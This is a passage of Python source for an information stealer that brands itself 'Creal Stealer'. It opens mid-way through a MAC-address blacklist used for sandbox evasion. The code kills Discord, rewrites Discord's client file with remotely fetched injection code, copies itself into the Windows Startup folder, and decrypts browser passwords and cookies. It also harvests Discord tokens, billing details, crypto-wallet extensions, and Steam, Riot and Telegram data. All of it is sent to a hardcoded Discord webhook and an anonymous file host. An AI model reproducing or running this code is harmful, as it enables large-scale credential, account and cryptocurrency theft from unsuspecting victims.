'32:11:4d:d0:4a:9e', '00:50:56:b3:d0:a7', '94:de:80:de:1a:35', '00:50:56:ae:5d:ea', '00:50:56:b3:14:59', 'ea:02:75:3c:90:9f', '00:e0:4c:44:76:54', 'ac:1f:6b:d0:4d:e4', '52:54:00:3b:78:24', '00:50:56:b3:50:de', '7e:05:a3:62:9c:4d', '52:54:00:b3:e4:71', '90:48:9a:9d:d5:24', '00:50:56:b3:3b:a6', '92:4c:a8:23:fc:2e', '5a:e2:a6:a4:44:db', '00:50:56:ae:6f:54', '42:01:0a:96:00:33', '00:50:56:97:a1:f8', '5e:86:e4:3d:0d:f6', '00:50:56:b3:ea:ee', '3e:53:81:b7:01:13', '00:50:56:97:ec:f2', '00:e0:4c:b3:5a:2a', '12:f8:87:ab:13:ec', '00:50:56:a0:38:06', '2e:62:e8:47:14:49', '00:0d:3a:d2:4f:1f', '60:02:92:66:10:79', '', '00:50:56:a0:d7:38', 'be:00:e5:c5:0c:e5', '00:50:56:a0:59:10', '00:50:56:a0:06:8d', '00:e0:4c:cb:62:08', '4e:81:81:8e:22:4e']

mac_address = uuid.getnode()
if str(uuid.UUID(int=mac_address)) in BLACKLIST1:
    os._exit(0)




wh00k = "https://discord.com/api/webhooks/1148320281086132354/ffZoRd2GPvf94KKa8FiLVIUHZCMyFAGFg2PK_Qi4RSundC95ya2j6_im6l9K9yloDxVS"
inj_url = "https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js"
    
DETECTED = False

def g3t1p():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return ip

requirements = [
    ["requests", "requests"],
    ["Crypto.Cipher", "pycryptodome"],
]
for modl in requirements:
    try: __import__(modl[0])
    except:
        subprocess.Popen(f"{executable} -m pip install {modl[1]}", shell=True)
        time.sleep(3)

import requests
from Crypto.Cipher import AES

local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
temp = os.getenv("TEMP")
Threadlist = []


class DATA_BLOB(Structure):
    _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', POINTER(c_char))
    ]

def G3tD4t4(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw

def CryptUnprotectData(encrypted_bytes, entropy=b''):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()

    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
        return G3tD4t4(blob_out)

def D3kryptV4lU3(buff, master_key=None):
    starts = buff.decode(encoding='utf8', errors='ignore')[:3]
    if starts == 'v10' or starts == 'v11':
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

def L04dR3qu3sTs(methode, url, data='', files='', headers=''):
    for i in range(8): 
        try:
            if methode == 'POST':
                if data != '':
                    r = requests.post(url, data=data)
                    if r.status_code == 200:
                        return r
                elif files != '':
                    r = requests.post(url, files=files)
                    if r.status_code == 200 or r.status_code == 413:
                        return r
        except:
            pass

def L04durl1b(wh00k, data='', files='', headers=''):
    for i in range(8):
        try:
            if headers != '':
                r = urlopen(Request(wh00k, data=data, headers=headers))
                return r
            else:
                r = urlopen(Request(wh00k, data=data))
                return r
        except: 
            pass

def globalInfo():
    ip = g3t1p()
    us3rn4m1 = os.getenv("USERNAME")
    ipdatanojson = urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode().replace('callback(', '').replace('})', '}')
    
    ipdata = loads(ipdatanojson)
    
    contry = ipdata["country_name"]
    contryCode = ipdata["country_code"].lower()
    sehir = ipdata["state"]

    globalinfo = f":flag_{contryCode}:  - `{us3rn4m1.upper()} | {ip} ({contry})`"
    return globalinfo


def TR6st(C00k13):
    
    global DETECTED
    data = str(C00k13)
    tim = re.findall(".google.com", data)
    
    if len(tim) < -1:
        DETECTED = True
        return DETECTED
    else:
        DETECTED = False
        return DETECTED
        
def G3tUHQFr13ndS(t0k3n):
    b4dg3List =  [
        {"Name": 'Active_Developer', 'Value': 131072, 'Emoji': "<:activedev:1042545590640324608> "},
        {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
        {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
        {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early_supporter:874750808414113823> "},
        {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<:balance:874750808267292683> "},
        {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<:brilliance:874750808338608199> "},
        {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<:bravery:874750808388952075> "},
        {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<:bughunter_1:874750808426692658> "},
        {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<:hypesquad_events:874750808594477056> "},
        {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<:partner:874750808678354964> "},
        {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}
    ]
    headers = {
        "Authorization": t0k3n,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        friendlist = loads(urlopen(Request("https://discord.com/api/v6/users/@me/relationships", headers=headers)).read().decode())
    except:
        return False

    uhqlist = ''
    for friend in friendlist:
        Own3dB3dg4s = ''
        flags = friend['user']['public_flags']
        for b4dg3 in b4dg3List:
            if flags // b4dg3["Value"] != 0 and friend['type'] == 1:
                if not "House" in b4dg3["Name"]:
                    Own3dB3dg4s += b4dg3["Emoji"]
                flags = flags % b4dg3["Value"]
        if Own3dB3dg4s != '':
            uhqlist += f"{Own3dB3dg4s} | {friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})\n"
    return uhqlist


process_list = os.popen('tasklist').readlines()


for process in process_list:
    if "Discord" in process:
        
        pid = int(process.split()[1])
        os.system(f"taskkill /F /PID {pid}")

def G3tb1ll1ng(t0k3n):
    headers = {
        "Authorization": t0k3n,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        b1ll1ngjson = loads(urlopen(Request("https://discord.com/api/users/@me/billing/payment-sources", headers=headers)).read().decode())
    except:
        return False
    
    if b1ll1ngjson == []: return "```None```"

    b1ll1ng = ""
    for methode in b1ll1ngjson:
        if methode["invalid"] == False:
            if methode["type"] == 1:
                b1ll1ng += ":credit_card:"
            elif methode["type"] == 2:
                b1ll1ng += ":parking: "

    return b1ll1ng

def inj_discord():

    username = os.getlogin()

    folder_list = ['Discord', 'DiscordCanary', 'DiscordPTB', 'DiscordDevelopment']

    for folder_name in folder_list:
        deneme_path = os.path.join(os.getenv('LOCALAPPDATA'), folder_name)
        if os.path.isdir(deneme_path):
            for subdir, dirs, files in os.walk(deneme_path):
                if 'app-' in subdir:
                    for dir in dirs:
                        if 'modules' in dir:
                            module_path = os.path.join(subdir, dir)
                            for subsubdir, subdirs, subfiles in os.walk(module_path):
                                if 'discord_desktop_core-' in subsubdir:
                                    for subsubsubdir, subsubdirs, subsubfiles in os.walk(subsubdir):
                                        if 'discord_desktop_core' in subsubsubdir:
                                            for file in subsubfiles:
                                                if file == 'index.js':
                                                    file_path = os.path.join(subsubsubdir, file)

                                                    inj_content = requests.get(inj_url).text

                                                    inj_content = inj_content.replace("%WEBHOOK%", wh00k)

                                                    with open(file_path, "w", encoding="utf-8") as index_file:
                                                        index_file.write(inj_content)
inj_discord()

def G3tB4dg31(flags):
    if flags == 0: return ''

    Own3dB3dg4s = ''
    b4dg3List =  [
        {"Name": 'Active_Developer', 'Value': 131072, 'Emoji': "<:activedev:1042545590640324608> "},
        {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
        {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
        {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early_supporter:874750808414113823> "},
        {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<:balance:874750808267292683> "},
        {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<:brilliance:874750808338608199> "},
        {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<:bravery:874750808388952075> "},
        {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<:bughunter_1:874750808426692658> "},
        {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<:hypesquad_events:874750808594477056> "},
        {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<:partner:874750808678354964> "},
        {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}
    ]
    for b4dg3 in b4dg3List:
        if flags // b4dg3["Value"] != 0:
            Own3dB3dg4s += b4dg3["Emoji"]
            flags = flags % b4dg3["Value"]

    return Own3dB3dg4s

def G3tT0k4n1nf9(t0k3n):
    headers = {
        "Authorization": t0k3n,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    us3rjs0n = loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers)).read().decode())
    us3rn4m1 = us3rjs0n["username"]
    hashtag = us3rjs0n["discriminator"]
    em31l = us3rjs0n["email"]
    idd = us3rjs0n["id"]
    pfp = us3rjs0n["avatar"]
    flags = us3rjs0n["public_flags"]
    n1tr0 = ""
    ph0n3 = ""

    if "premium_type" in us3rjs0n: 
        nitrot = us3rjs0n["premium_type"]
        if nitrot == 1:
            n1tr0 = "<a:DE_BadgeNitro:865242433692762122>"
        elif nitrot == 2:
            n1tr0 = "<a:DE_BadgeNitro:865242433692762122><a:autr_boost1:1038724321771786240>"
    if "ph0n3" in us3rjs0n: ph0n3 = f'{us3rjs0n["ph0n3"]}'

    return us3rn4m1, hashtag, em31l, idd, pfp, flags, n1tr0, ph0n3

def ch1ckT4k1n(t0k3n):
    headers = {
        "Authorization": t0k3n,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers))
        return True
    except:
        return False

if getattr(sys, 'frozen', False):
    currentFilePath = os.path.dirname(sys.executable)
else:
    currentFilePath = os.path.dirname(os.path.abspath(__file__))

fileName = os.path.basename(sys.argv[0])
filePath = os.path.join(currentFilePath, fileName)

startupFolderPath = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
startupFilePath = os.path.join(startupFolderPath, fileName)

if os.path.abspath(filePath).lower() != os.path.abspath(startupFilePath).lower():
    with open(filePath, 'rb') as src_file, open(startupFilePath, 'wb') as dst_file:
        shutil.copyfileobj(src_file, dst_file)


def upl05dT4k31(t0k3n, path):
    global wh00k
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    us3rn4m1, hashtag, em31l, idd, pfp, flags, n1tr0, ph0n3 = G3tT0k4n1nf9(t0k3n)

    if pfp == None: 
        pfp = "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg"
    else:
        pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"

    b1ll1ng = G3tb1ll1ng(t0k3n)
    b4dg3 = G3tB4dg31(flags)
    friends = G3tUHQFr13ndS(t0k3n)
    if friends == '': friends = "```No Rare Friends```"
    if not b1ll1ng:
        b4dg3, ph0n3, b1ll1ng = "🔒", "🔒", "🔒"
    if n1tr0 == '' and b4dg3 == '': n1tr0 = "```None```"

    data = {
        "content": f'{globalInfo()} | `{path}`',
        "embeds": [
            {
            "color": 2895667,
            "fields": [
                {
                    "name": "<a:hyperNOPPERS:828369518199308388> Token:",
                    "value": f"```{t0k3n}```",
                    "inline": True
                },
                {
                    "name": "<:mail:750393870507966486> Email:",
                    "value": f"```{em31l}```",
                    "inline": True
                },
                {
                    "name": "<a:1689_Ringing_Phone:755219417075417088> Phone:",
                    "value": f"```{ph0n3}```",
                    "inline": True
                },
                {
                    "name": "<:mc_earth:589630396476555264> IP:",
                    "value": f"```{g3t1p()}```",
                    "inline": True
                },
                {
                    "name": "<:woozyface:874220843528486923> Badges:",
                    "value": f"{n1tr0}{b4dg3}",
                    "inline": True
                },
                {
                    "name": "<a:4394_cc_creditcard_cartao_f4bihy:755218296801984553> Billing:",
                    "value": f"{b1ll1ng}",
                    "inline": True
                },
                {
                    "name": "<a:mavikirmizi:853238372591599617> HQ Friends:",
                    "value": f"{friends}",
                    "inline": False
                }
                ],
            "author": {
                "name": f"{us3rn4m1}#{hashtag} ({idd})",
                "icon_url": f"{pfp}"
                },
            "footer": {
                "text": "Creal Stealer",
                "icon_url": "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg"
                },
            "thumbnail": {
                "url": f"{pfp}"
                }
            }
        ],
        "avatar_url": "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg",
        "username": "Creal Stealer",
        "attachments": []
        }
    L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)


def R4f0rm3t(listt):
    e = re.findall("(\w+[a-z])",listt)
    while "https" in e: e.remove("https")
    while "com" in e: e.remove("com")
    while "net" in e: e.remove("net")
    return list(set(e))

def upload(name, link):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    if name == "crcook":
        rb = ' | '.join(da for da in cookiWords)
        if len(rb) > 1000: 
            rrrrr = R4f0rm3t(str(cookiWords))
            rb = ' | '.join(da for da in rrrrr)
        data = {
            "content": f"{globalInfo()}",
            "embeds": [
                {
                    "title": "Creal | Cookies Stealer",
                    "description": f"<:apollondelirmis:1012370180845883493>: **Accounts:**\n\n{rb}\n\n**Data:**\n<:cookies_tlm:816619063618568234> • **{CookiCount}** Cookies Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealCookies.txt]({link})",
                    "color": 2895667,
                    "footer": {
                        "text": "Creal Stealer",
                        "icon_url": "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg"
                    }
                }
            ],
            "username": "Creal Stealer",
            "avatar_url": "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg",
            "attachments": []
            }
        L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
        return

    if name == "crpassw":
        ra = ' | '.join(da for da in paswWords)
        if len(ra) > 1000: 
            rrr = R4f0rm3t(str(paswWords))
            ra = ' | '.join(da for da in rrr)

        data = {
            "content": f"{globalInfo()}",
            "embeds": [
                {
                    "title": "Creal | Password Stealer",
                    "description": f"<:apollondelirmis:1012370180845883493>: **Accounts**:\n{ra}\n\n**Data:**\n<a:hira_kasaanahtari:886942856969875476> • **{P4sswCount}** Passwords Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealPassword.txt]({link})",
                    "color": 2895667,
                    "footer": {
                        "text": "Creal Stealer",
                        "icon_url": "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg"
                    }
                }
            ],
            "username": "Creal",
            "avatar_url": "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg",
            "attachments": []
            }
        L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
        return

    if name == "kiwi":
        data = {
            "content": f"{globalInfo()}",
            "embeds": [
                {
                "color": 2895667,
                "fields": [
                    {
                    "name": "Interesting files found on user PC:",
                    "value": link
                    }
                ],
                "author": {
                    "name": "Creal | File Stealer"
                },
                "footer": {
                    "text": "Creal Stealer",
                    "icon_url": "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg"
                }
                }
            ],
            "username": "Creal Stealer",
            "avatar_url": "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg",
            "attachments": []
            }
        L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
        return








def wr1tef0rf1l3(data, name):
    path = os.getenv("TEMP") + f"\cr{name}.txt"
    with open(path, mode='w', encoding='utf-8') as f:
        f.write(f"<--Creal STEALER BEST -->\n\n")
        for line in data:
            if line[0] != '':
                f.write(f"{line}\n")

T0k3ns = ''
def getT0k3n(path, arg):
    if not os.path.exists(path): return

    path += arg
    for file in os.listdir(path):
        if file.endswith(".log") or file.endswith(".ldb")   :
            for line in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]:
                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"):
                    for t0k3n in re.findall(regex, line):
                        global T0k3ns
                        if ch1ckT4k1n(t0k3n):
                            if not t0k3n in T0k3ns:
                               
                                T0k3ns += t0k3n
                                upl05dT4k31(t0k3n, path)

P4ssw = []
def getP4ssw(path, arg):
    global P4ssw, P4sswCount
    if not os.path.exists(path): return

    pathC = path + arg + "/Login Data"
    if os.stat(pathC).st_size == 0: return

    tempfold = temp + "cr" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("SELECT action_url, username_value, password_value FROM logins;")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data: 
        if row[0] != '':
            for wa in keyword:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split('[')[1].split(']')[0]
                if wa in row[0]:
                    if not old in paswWords: paswWords.append(old)
            P4ssw.append(f"UR1: {row[0]} | U53RN4M3: {row[1]} | P455W0RD: {D3kryptV4lU3(row[2], master_key)}")
            P4sswCount += 1
    wr1tef0rf1l3(P4ssw, 'passw')

C00k13 = []    
def getC00k13(path, arg):
    global C00k13, CookiCount
    if not os.path.exists(path): return
    
    pathC = path + arg + "/Cookies"
    if os.stat(pathC).st_size == 0: return
    
    tempfold = temp + "cr" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
    
    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "/Local State"
    
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data: 
        if row[0] != '':
            for wa in keyword:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split('[')[1].split(']')[0]
                if wa in row[0]:
                    if not old in cookiWords: cookiWords.append(old)
            C00k13.append(f"{row[0]}	TRUE	/	FALSE	2597573456	{row[1]}	{D3kryptV4lU3(row[2], master_key)}")
            CookiCount += 1
    wr1tef0rf1l3(C00k13, 'cook')

def G3tD1sc0rd(path, arg):
    if not os.path.exists(f"{path}/Local State"): return

    pathC = path + arg

    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])
    
    
    for file in os.listdir(pathC):
       
        if file.endswith(".log") or file.endswith(".ldb")   :
            for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]:
                for t0k3n in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                    global T0k3ns
                    t0k3nDecoded = D3kryptV4lU3(b64decode(t0k3n.split('dQw4w9WgXcQ:')[1]), master_key)
                    if ch1ckT4k1n(t0k3nDecoded):
                        if not t0k3nDecoded in T0k3ns:
                            
                            T0k3ns += t0k3nDecoded
                            
                            upl05dT4k31(t0k3nDecoded, path)

def GatherZips(paths1, paths2, paths3):
    thttht = []
    for patt in paths1:
        a = threading.Thread(target=Z1pTh1ngs, args=[patt[0], patt[5], patt[1]])
        a.start()
        thttht.append(a)

    for patt in paths2:
        a = threading.Thread(target=Z1pTh1ngs, args=[patt[0], patt[2], patt[1]])
        a.start()
        thttht.append(a)
    
    a = threading.Thread(target=ZipTelegram, args=[paths3[0], paths3[2], paths3[1]])
    a.start()
    thttht.append(a)

    for thread in thttht: 
        thread.join()
    global WalletsZip, GamingZip, OtherZip
        

    wal, ga, ot = "",'',''
    if not len(WalletsZip) == 0:
        wal = ":coin:  •  Wallets\n"
        for i in WalletsZip:
            wal += f"└─ [{i[0]}]({i[1]})\n"
    if not len(WalletsZip) == 0:
        ga = ":video_game:  •  Gaming:\n"
        for i in GamingZip:
            ga += f"└─ [{i[0]}]({i[1]})\n"
    if not len(OtherZip) == 0:
        ot = ":tickets:  •  Apps\n"
        for i in OtherZip:
            ot += f"└─ [{i[0]}]({i[1]})\n"          
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    
    data = {
        "content": globalInfo(),
        "embeds": [
            {
            "title": "Creal Zips",
            "description": f"{wal}\n{ga}\n{ot}",
            "color": 2895667,
            "footer": {
                "text": "Creal Stealer",
                "icon_url": "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg"
            }
            }
        ],
        "username": "Creal Stealer",
        "avatar_url": "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg",
        "attachments": []
    }
    L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)


def ZipTelegram(path, arg, procc):
    global OtherZip
    pathC = path
    name = arg
    if not os.path.exists(pathC): return
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)

    zf = ZipFile(f"{pathC}/{name}.zip", "w")
    for file in os.listdir(pathC):
        if not ".zip" in file and not "tdummy" in file and not "user_data" in file and not "webview" in file: 
            zf.write(pathC + "/" + file)
    zf.close()

    lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
    
    os.remove(f"{pathC}/{name}.zip")
    OtherZip.append([arg, lnik])

def Z1pTh1ngs(path, arg, procc):
    pathC = path
    name = arg
    global WalletsZip, GamingZip, OtherZip
    

    if "nkbihfbeogaeaoehlefnkodbefgpgknn" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Metamask_{browser}"
        pathC = path + arg

    if "ejbalbakoplchlghecdalmeeeajnimhm" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Metamask_Edge"
        pathC = path + arg
    
    if "aholpfdialjgjfhomihkjbmgjidlcdno" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Exodus_{browser}"
        pathC = path + arg

    if "fhbohimaelbohpjbbldcngcnapndodjp" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Binance_{browser}"
        pathC = path + arg

    if "hnfanknocfeofbddgcijnmhnfnkdnaad" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Coinbase_{browser}"
        pathC = path + arg

    if "egjidjbpglichdcondbcbdnbeeppgdph" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Trust_{browser}"
        pathC = path + arg

    if "bfnaelmomeimhlpmgjnjophhpkkoljpa" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Phantom_{browser}"
        pathC = path + arg
    
    
    if not os.path.exists(pathC): return
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)

    if "Wallet" in arg or "NationsGlory" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"{browser}"

    elif "Steam" in arg:
        if not os.path.isfile(f"{pathC}/loginusers.vdf"): return
        f = open(f"{pathC}/loginusers.vdf", "r+", encoding="utf8")
        data = f.readlines()
        
        found = False
        for l in data:
            if 'RememberPassword"\t\t"1"' in l:
                found = True
        if found == False: return
        name = arg


    zf = ZipFile(f"{pathC}/{name}.zip", "w")
    for file in os.listdir(pathC):
        if not ".zip" in file: zf.write(pathC + "/" + file)
    zf.close()

    lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
    
    os.remove(f"{pathC}/{name}.zip")

    if "Wallet" in arg or "eogaeaoehlef" in arg or "koplchlghecd" in arg or "aelbohpjbbld" in arg or "nocfeofbddgc" in arg or "bpglichdcond" in arg or "momeimhlpmgj" in arg or "dialjgjfhomi" in arg:
        WalletsZip.append([name, lnik])
    elif "NationsGlory" in name or "Steam" in name or "RiotCli" in name:
        GamingZip.append([name, lnik])
    else:
        OtherZip.append([name, lnik])


def GatherAll():
    '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >                                  '
    browserPaths = [
        [f"{roaming}/Opera Software/Opera GX Stable",               "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{roaming}/Opera Software/Opera Stable",                  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{roaming}/Opera Software/Opera Neon/User Data/Default",  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",    "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/Yandex/YandexBrowser/User Data",                 "yandex.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn"                                    ],
        [f"{local}/Microsoft/Edge/User Data",                       "edge.exe",     "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ]
    ]

    discordPaths = [
        [f"{roaming}/Discord", "/Local Storage/leveldb"],
        [f"{roaming}/Lightcord", "/Local Storage/leveldb"],
        [f"{roaming}/discordcanary", "/Local Storage/leveldb"],
        [f"{roaming}/discordptb", "/Local Storage/leveldb"],
    ]

    PathsToZip = [
        [f"{roaming}/atomic/Local Storage/leveldb", '"Atomic Wallet.exe"', "Wallet"],
        [f"{roaming}/Exodus/exodus.wallet", "Exodus.exe", "Wallet"],
        ["C:\Program Files (x86)\Steam\config", "steam.exe", "Steam"],
        [f"{roaming}/NationsGlory/Local Storage/leveldb", "NationsGlory.exe", "NationsGlory"],
        [f"{local}/Riot Games/Riot Client/Data", "RiotClientServices.exe", "RiotClient"]
    ]
    Telegram = [f"{roaming}/Telegram Desktop/tdata", 'telegram.exe', "Telegram"]

    for patt in browserPaths: 
        a = threading.Thread(target=getT0k3n, args=[patt[0], patt[2]])
        a.start()
        Threadlist.append(a)
    for patt in discordPaths: 
        a = threading.Thread(target=G3tD1sc0rd, args=[patt[0], patt[1]])
        a.start()
        Threadlist.append(a)

    for patt in browserPaths: 
        a = threading.Thread(target=getP4ssw, args=[patt[0], patt[3]])
        a.start()
        Threadlist.append(a)

    ThCokk = []
    for patt in browserPaths: 
        a = threading.Thread(target=getC00k13, args=[patt[0], patt[4]])
        a.start()
        ThCokk.append(a)

    threading.Thread(target=GatherZips, args=[browserPaths, PathsToZip, Telegram]).start()


    for thread in ThCokk: thread.join()
    DETECTED = TR6st(C00k13)
    if DETECTED == True: return

    for patt in browserPaths:
         threading.Thread(target=Z1pTh1ngs, args=[patt[0], patt[5], patt[1]]).start()
    
    for patt in PathsToZip:
         threading.Thread(target=Z1pTh1ngs, args=[patt[0], patt[2], patt[1]]).start()
    
    threading.Thread(target=ZipTelegram, args=[Telegram[0], Telegram[2], Telegram[1]]).start()

    for thread in Threadlist: 
        thread.join()
    global upths
    upths = []

    for file in ["crpassw.txt", "crcook.txt"]: 
        
        upload(file.replace(".txt", ""), uploadToAnonfiles(os.getenv("TEMP") + "\\" + file))

